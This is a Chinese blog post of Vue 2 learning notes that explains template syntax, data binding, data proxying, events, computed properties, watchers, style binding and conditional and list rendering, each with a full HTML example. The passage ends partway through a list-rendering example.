---
title: Vue2的学习笔记
date: 2024-05-04 14:02:06
cover: https://ypycdn.nanshuo.icu/posts/vue/vue.webp
excerpt: 本文详细介绍了Vue.js框架的基本概念、核心特性和使用方式。首先解释了Vue的含义和特点，包括组件化、响应式数据绑定和虚拟DOM等。然后，通过实例展示了Vue的基本语法，如插值语法、指令、事件处理、计算属性和侦听属性。接着，探讨了Vue的组件化编程，包括组件的创建、注册和使用，以及组件间的通信和数据传递。此外，还介绍了Vue的生命周期钩子、过滤器、内置指令和自定义指令的使用。最后，本文还涉及了Vue在Ajax请求、跨域问题解决、插槽、Vuex状态管理和Vue Router路由管理等方面的应用，以及如何与Element UI等UI组件库结合使用，提供了一个全面的Vue.js学习指南。
#permalink: /archives/KPVuB3Oa
isOriginal: true
category:
 - vue
tag: 
 - vue
 - 前端
---

>Vue2的基础学习
点击[这里](https://cn.vuejs.org/)进入Vue的官网学习
本文是基于[尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通](https://www.bilibili.com/video/BV1Zy4y1K7SH?p=1&vd_source=73d15d6a3c5824665c87aa3c4b34c7c2)进行学习的,文章的各种资源等来自这里,仅供学习参考!!!
基本语法也可以参照[菜鸟教程](https://www.runoob.com/vue2/vue-tutorial.html)
学习资料获取
百度网盘
链接：<https://pan.baidu.com/s/15km4W856ufNV-dgPmRXwtA>
提取码：0814

# Vue的认识

## Vue的含义

**Vue** 是一套用来动态**构建用户界面**的**渐进式**JavaScript前端框架

- **构建用户界面**：把数据通过某种办法变成用户界面

- **渐进式：**Vue可以自底向上逐层的应用，简单应用只需要一个轻量小巧的核心库，复杂应用可以引入各式各样的Vue插件

## Vue的特点

- 采用组件化模式,提高代码复用率、且让代码更好的维护
  ![image-20230208135707556](https://ypycdn.nanshuo.icu/posts/vue/image-20230208135707556.png)



- 声明式编码，让编码人员无需直接操作DOM，提高开发效率

![image-20230208140722077](https://ypycdn.nanshuo.icu/posts/vue/image-20230208140722077.png)


- 使用虚拟的DOM+优秀的Diff算法，尽量复用DOM节点
  ![image-20230208141459549](https://ypycdn.nanshuo.icu/posts/vue/image-20230208141459549.png)



# Vue核心

使用Vue语法前需要引入Vue.js，可以使用CDN的方式引入

```js
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
```

也可以使用本地路径引入Vue.js，这则需要从官网下载Vue.js文件到本地才行

## 插值语法

- 功能：用于解析标签体内容。
- 写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。

![image-20230209194606719](https://ypycdn.nanshuo.icu/posts/vue/image-20230209194606719.png)

## 指令语法

- v-bind:

  - 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）,是单向数据绑定
  - 举例：v-bind:href="xxx"或简写为 :href="xxx"，xxx同样要写js表达式，且可以直接读取到data中的所有属性
  - 备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子

  - 简化："v-bind:"可以简写为":"

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr/>
			<h1>指令语法</h1>
			<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
			<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'jack',
				school:{
					name:'尚硅谷',
					url:'http://www.atguigu.com',
				}
			}
		})
	</script>
</html>
```

- v-model:
  - Vue中有2种数据绑定的方式：
  - 单向绑定(v-bind)：数据只能从data流向页面。
  - 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
  - 备注：双向绑定一般都应用在表单类元素上（如：input、select等）
  - v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
  - v-model只能应用在表单类元素（输入类元素）上

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<div id="root">
			单向数据绑定：<input type="text" :value="name"><br/>
			双向数据绑定：<input type="text" v-model="name"><br/>
			<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
			<!-- <h2 v-model:x="name">你好啊</h2> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```

## el和data的两种写法

- el有2种写法
  - new Vue时候配置el属性。
  - 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。

- data有2种写法
  - 对象式
  - 函数式
  - 如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。

- 一个重要的原则：Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```

## Vue中的MVVM模型

- M：模型(Model) ：data中的数据
- V：视图(View) ：模板代码
- VM：视图模型(ViewModel)：Vue实例
- 观察发现
  - data中所有的属性，最后都出现在了vm身上。
  - vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>理解MVVM</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>学校名称：{{name}}</h1>
			<h1>学校地址：{{address}}</h1>
			<!-- <h1>测试一下1：{{1+1}}</h1>
			<h1>测试一下2：{{$options}}</h1>
			<h1>测试一下3：{{$emit}}</h1>
			<h1>测试一下4：{{_c}}</h1> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'北京',
			}
		})
		console.log(vm)
	</script>
</html>
```

## 数据代理

- Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
- Vue中数据代理的好处：更加方便的操作data中的数据
- 基本原理：通过Object.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性

![image-20230209210544481](https://ypycdn.nanshuo.icu/posts/vue/image-20230209210544481.png)


```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})

			// console.log(Object.keys(person))

			console.log(person)
		</script>
	</body>
</html>
```

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
		<script type="text/javascript" >
			let obj = {x:100}
			let obj2 = {y:200}

			Object.defineProperty(obj2,'x',{
				get(){
					return obj.x
				},
				set(value){
					obj.x = value
				}
			})
		</script>
	</body>
</html>
```

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>Vue中的数据代理</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>学校名称：{{name}}</h2>
			<h2>学校地址：{{address}}</h2>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				address:'宏福科技园'
			}
		})
	</script>
</html>
```

## 事件处理

- 事件的基本使用：
  - 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名
  - 事件的回调需要配置在methods对象中，最终会在vm上
  - methods中配置的函数，不要用箭头函数！否则this就不是vm了
  - methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象
  - @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

- 事件修饰符
  -  prevent：阻止默认事件（常用）
  -  stop：阻止事件冒泡（常用）
  -  once：事件只触发一次（常用）
  -  capture：使用事件的捕获模式
  -  self：只有event.target是当前操作的元素时才触发事件
  -  passive：事件的默认行为立即执行，无需等待事件回调执行完毕

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
			<ul @wheel.passive="demo" class="list">
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

### 键盘事件

- Vue中常用的按键别名：
  - 回车 => enter
  - 删除 => delete (捕获“删除”和“退格”键)
  - 退出 => esc
  - 空格 => space
  - 换行 => tab (特殊，必须配合keydown去使用)
  - 上 => up
  - 下 => down
  - 左 => left
  - 右 => right
- Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
- 系统修饰键（用法特殊）：ctrl、alt、shift、meta
  - 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
  - 配合keydown使用：正常触发事件。
- 也可以使用keyCode去指定具体的按键（不推荐）
- Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>键盘事件</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods: {
				showInfo(e){
					// console.log(e.key,e.keyCode)
					console.log(e.target.value)
				}
			},
		})
	</script>
</html>
```

## 计算属性computed

- 定义：要用的属性不存在，要通过已有属性计算得来

- 原理：底层借助了Objcet.defineproperty方法提供的getter和setter

- get函数什么时候执行

- - 初次读取时会执行一次

- 当依赖的数据发生改变时会被再次调用。

- 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便

- 备注

  - 计算属性最终会出现在vm上，直接读取使用即可
  - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变

- 姓名案例（3个）的不同方法实现对比

  - 插值语法实现

    ```js
    <!DOCTYPE html>
    <html>
    	<head>
    		<meta charset="UTF-8" />
    		<title>姓名案例_插值语法实现</title>
    		<!-- 引入Vue -->
    		<script type="text/javascript" src="../js/vue.js"></script>
    	</head>
    	<body>
    		<!-- 准备好一个容器-->
    		<div id="root">
    			姓：<input type="text" v-model="firstName"> <br/><br/>
    			名：<input type="text" v-model="lastName"> <br/><br/>
    			全名：<span>{{firstName}}-{{lastName}}</span>
    		</div>
    	</body>
    
    	<script type="text/javascript">
    		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    		new Vue({
    			el:'#root',
    			data:{
    				firstName:'张',
    				lastName:'三'
    			}
    		})
    	</script>
    </html>
    ```

  - method实现

    ```js
    <!DOCTYPE html>
    <html>
    	<head>
    		<meta charset="UTF-8" />
    		<title>姓名案例_methods实现</title>
    		<!-- 引入Vue -->
    		<script type="text/javascript" src="../js/vue.js"></script>
    	</head>
    	<body>
    		<!-- 准备好一个容器-->
    		<div id="root">
    			姓：<input type="text" v-model="firstName"> <br/><br/>
    			名：<input type="text" v-model="lastName"> <br/><br/>
    			全名：<span>{{fullName()}}</span>
    		</div>
    	</body>
    
    	<script type="text/javascript">
    		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    		new Vue({
    			el:'#root',
    			data:{
    				firstName:'张',
    				lastName:'三'
    			},
    			methods: {
    				fullName(){
    					console.log('@---fullName')
    					return this.firstName + '-' + this.lastName
    				}
    			},
    		})
    	</script>
    </html>
    ```

  - 计算属性属性

    ```js
    <!DOCTYPE html>
    <html>
    	<head>
    		<meta charset="UTF-8" />
    		<title>姓名案例_计算属性实现</title>
    		<!-- 引入Vue -->
    		<script type="text/javascript" src="../js/vue.js"></script>
    	</head>
    	<body>
    		<!-- 准备好一个容器-->
    		<div id="root">
    			姓：<input type="text" v-model="firstName"> <br/><br/>
    			名：<input type="text" v-model="lastName"> <br/><br/>
    			测试：<input type="text" v-model="x"> <br/><br/>
    			全名：<span>{{fullName}}</span> <br/><br/>
    			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
    			全名：<span>{{fullName}}</span> <br/><br/>
    			全名：<span>{{fullName}}</span> -->
    		</div>
    	</body>
    
    	<script type="text/javascript">
    		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    		const vm = new Vue({
    			el:'#root',
    			data:{
    				firstName:'张',
    				lastName:'三',
    				x:'你好'
    			},
    			methods: {
    				demo(){
    					
    				}
    			},
    			computed:{
    				fullName:{
    					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
    					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
    					get(){
    						console.log('get被调用了')
    						// console.log(this) //此处的this是vm
    						return this.firstName + '-' + this.lastName
    					},
    					//set什么时候调用? 当fullName被修改时。
    					set(value){
    						console.log('set',value)
    						const arr = value.split('-')
    						this.firstName = arr[0]
    						this.lastName = arr[1]
    					}
    				}
    			}
    		})
    	</script>
    </html>
    ```

  - 计算属性简写

    ```js
    <!DOCTYPE html>
    <html>
    	<head>
    		<meta charset="UTF-8" />
    		<title>姓名案例_计算属性实现</title>
    		<!-- 引入Vue -->
    		<script type="text/javascript" src="../js/vue.js"></script>
    	</head>
    	<body>
    		<!-- 准备好一个容器-->
    		<div id="root">
    			姓：<input type="text" v-model="firstName"> <br/><br/>
    			名：<input type="text" v-model="lastName"> <br/><br/>
    			全名：<span>{{fullName}}</span> <br/><br/>
    		</div>
    	</body>
    
    	<script type="text/javascript">
    		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    
    		const vm = new Vue({
    			el:'#root',
    			data:{
    				firstName:'张',
    				lastName:'三',
    			},
    			computed:{
    				//完整写法
    				/* fullName:{
    					get(){
    						console.log('get被调用了')
    						return this.firstName + '-' + this.lastName
    					},
    					set(value){
    						console.log('set',value)
    						const arr = value.split('-')
    						this.firstName = arr[0]
    						this.lastName = arr[1]
    					}
    				} */
    				//简写
    				fullName(){
    					console.log('get被调用了')
    					return this.firstName + '-' + this.lastName
    				}
    			}
    		})
    	</script>
    </html>
    ```

## 侦听属性watch

- 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
- 监视的属性必须存在，才能进行监视！！
- 监视的两种写法
- new Vue时传入watch配置
- 通过vm.$watch监视

- 天气案例

```js
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>天气案例</title>
        <!-- 引入Vue -->
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <!-- 准备好一个容器-->
        <div id="root">
            <h2>今天天气很{{info}}</h2>
            <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
            <!-- <button @click="isHot = !isHot">切换天气</button> -->
            <button @click="changeWeather">切换天气</button>
        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
        
        const vm = new Vue({
            el:'#root',
            data:{
                isHot:true,
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
        })
    </script>
</html>
```

- 监视属性

```js
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>天气案例_监视属性</title>
        <!-- 引入Vue -->
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <!-- 准备好一个容器-->
        <div id="root">
            <h2>今天天气很{{info}}</h2>
            <button @click="changeWeather">切换天气</button>
        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
        
        const vm = new Vue({
            el:'#root',
            data:{
                isHot:true,
            },
            computed:{
                info(){
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather(){
                    this.isHot = !this.isHot
                }
            },
            /* watch:{
                isHot:{
                    immediate:true, //初始化时让handler调用一下
                    //handler什么时候调用？当isHot发生改变时。
                    handler(newValue,oldValue){
                        console.log('isHot被修改了',newValue,oldValue)
                    }
                }
            } */
        })

        vm.$watch('isHot',{
            immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
                console.log('isHot被修改了',newValue,oldValue)
            }
        })
    </script>
</html>
```

- 深度监视

  - Vue中的watch默认不监测对象内部值的改变（一层）。
  - 配置deep:true可以监测对象内部值改变（多层）。
  - 备注
    - Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
    - 使用watch时根据数据的具体结构，决定是否采用深度监视。

  ```js
  <!DOCTYPE html>
  <html>
      <head>
          <meta charset="UTF-8" />
          <title>天气案例_深度监视</title>
          <!-- 引入Vue -->
          <script type="text/javascript" src="../js/vue.js"></script>
      </head>
      <body>
          <!-- 准备好一个容器-->
          <div id="root">
              <h2>今天天气很{{info}}</h2>
              <button @click="changeWeather">切换天气</button>
              <hr/>
              <h3>a的值是:{{numbers.a}}</h3>
              <button @click="numbers.a++">点我让a+1</button>
              <h3>b的值是:{{numbers.b}}</h3>
              <button @click="numbers.b++">点我让b+1</button>
              <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
              {{numbers.c.d.e}}
          </div>
      </body>
  
      <script type="text/javascript">
          Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
          
          const vm = new Vue({
              el:'#root',
              data:{
                  isHot:true,
                  numbers:{
                      a:1,
                      b:1,
                      c:{
                          d:{
                              e:100
                          }
                      }
                  }
              },
              computed:{
                  info(){
                      return this.isHot ? '炎热' : '凉爽'
                  }
              },
              methods: {
                  changeWeather(){
                      this.isHot = !this.isHot
                  }
              },
              watch:{
                  isHot:{
                      // immediate:true, //初始化时让handler调用一下
                      //handler什么时候调用？当isHot发生改变时。
                      handler(newValue,oldValue){
                          console.log('isHot被修改了',newValue,oldValue)
                      }
                  },
                  //监视多级结构中某个属性的变化
                  /* 'numbers.a':{
                      handler(){
                          console.log('a被改变了')
                      }
                  } */
                  //监视多级结构中所有属性的变化
                  numbers:{
                      deep:true,
                      handler(){
                          console.log('numbers改变了')
                      }
                  }
              }
          })
  
      </script>
  </html>	
  ```

- 姓名案例-Watch实现

  - computed和watch之间的区别
    - computed能完成的功能，watch都可以完成
    - watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
  - 两个重要的小原则
    - 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
    - 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_watch实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				fullName:'张-三'
			},
			watch:{
				firstName(val){
					setTimeout(()=>{
						console.log(this)
						this.fullName = val + '-' + this.lastName
					},1000);
				},
				lastName(val){
					this.fullName = this.firstName + '-' + val
				}
			}
		})
	</script>
</html>
```

## 绑定样式

- class样式

  - 写法:class="xxx" xxx可以是字符串、对象、数组。
  - 字符串写法适用于：类名不确定，要动态获取。
  - 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
  - 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

- style样式

  - :style="{fontSize: xxx}"其中xxx是动态值。
  - :style="[a,b]"其中a、b是样式对象。

  ```js
  <!DOCTYPE html>
  <html>
  	<head>
  		<meta charset="UTF-8" />
  		<title>绑定样式</title>
  		<style>
  			.basic{
  				width: 400px;
  				height: 100px;
  				border: 1px solid black;
  			}
  			
  			.happy{
  				border: 4px solid red;;
  				background-color: rgba(255, 255, 0, 0.644);
  				background: linear-gradient(30deg,yellow,pink,orange,yellow);
  			}
  			.sad{
  				border: 4px dashed rgb(2, 197, 2);
  				background-color: gray;
  			}
  			.normal{
  				background-color: skyblue;
  			}
  
  			.atguigu1{
  				background-color: yellowgreen;
  			}
  			.atguigu2{
  				font-size: 30px;
  				text-shadow:2px 2px 10px red;
  			}
  			.atguigu3{
  				border-radius: 20px;
  			}
  		</style>
  		<script type="text/javascript" src="../js/vue.js"></script>
  	</head>
  	<body>
  		<!-- 准备好一个容器-->
  		<div id="root">
  			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
  			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
  
  			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
  			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>
  
  			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
  			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>
  
  			<!-- 绑定style样式--对象写法 -->
  			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
  			<!-- 绑定style样式--数组写法 -->
  			<div class="basic" :style="styleArr">{{name}}</div>
  		</div>
  	</body>
  
  	<script type="text/javascript">
  		Vue.config.productionTip = false
  		
  		const vm = new Vue({
  			el:'#root',
  			data:{
  				name:'尚硅谷',
  				mood:'normal',
  				classArr:['atguigu1','atguigu2','atguigu3'],
  				classObj:{
  					atguigu1:false,
  					atguigu2:false,
  				},
  				styleObj:{
  					fontSize: '40px',
  					color:'red',
  				},
  				styleObj2:{
  					backgroundColor:'orange'
  				},
  				styleArr:[
  					{
  						fontSize: '40px',
  						color:'blue',
  					},
  					{
  						backgroundColor:'gray'
  					}
  				]
  			},
  			methods: {
  				changeMood(){
  					const arr = ['happy','sad','normal']
  					const index = Math.floor(Math.random()*3)
  					this.mood = arr[index]
  				}
  			},
  		})
  	</script>
  	
  </html>
  ```

## 条件渲染

- v-if
  - v-if="表达式"
  - v-else-if="表达式"
  - v-else="表达式"
  - 适用于：切换频率较低的场景。
  - 特点：不展示的DOM元素直接被移除。
  - 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
- v-show
  - 写法：v-show="表达式"
  - 适用于：切换频率较高的场景。
  - 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
  - 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>条件渲染</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是:{{n}}</h2>
			<button @click="n++">点我n+1</button>
			<!-- 使用v-show做条件渲染 -->
			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- 使用v-if做条件渲染 -->
			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

			<!-- v-else和v-else-if -->
			<!-- <div v-if="n === 1">Angular</div>
			<div v-else-if="n === 2">React</div>
			<div v-else-if="n === 3">Vue</div>
			<div v-else>哈哈</div> -->

			<!-- v-if与template的配合使用 -->
			<template v-if="n === 1">
				<h2>你好</h2>
				<h2>尚硅谷</h2>
				<h2>北京</h2>
			</template>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:0
			}
		})
	</script>
</html>
```

## 列表渲染

-  v-for指令

-  用于展示列表数据

-  语法：v-for="(item, index) in xxx" :key="yyy"

-  可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本列表</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 遍历数组 -->
			<h2>人员列表（遍历数组）</h2>
			<ul>
				<li v-for="(p,index) of persons" :key="index">
					{{p.name}}-{{p.age}}
				</li>
			</ul>

			<!-- 遍历对象 -->
			<h2>汽车信息（遍历对象）</h2>
			<ul>
				<li v-for="(value,k) of car" :key="k">
					{{k}}-{{value}}
				</li>
			</ul>

			<!-- 遍历字符串 -->
			<h2>测试遍历字符串（用得少）</h2>
			<ul>
				<li v-for="(char,index) of str" :key="index">
					{{char}}-{{index}}
				</li>
			</ul>
			
			<!-- 遍历指定次数 -->
			<h2>测试遍历指定次数（用得少）</h2>
			<ul>
				<li v-for="(number,index) of 5" :key="index">
					{{index}}-{{number}}
				</li>
			</ul>
		</div>

		<script type="text/javascript">
			Vue.config.productionTip = false
			
			new Vue({
				el:'#root',
				data:{
					persons:[
						{id:'001',name:'张三',age:18},
						{id:'002',name:'李四',age:19},
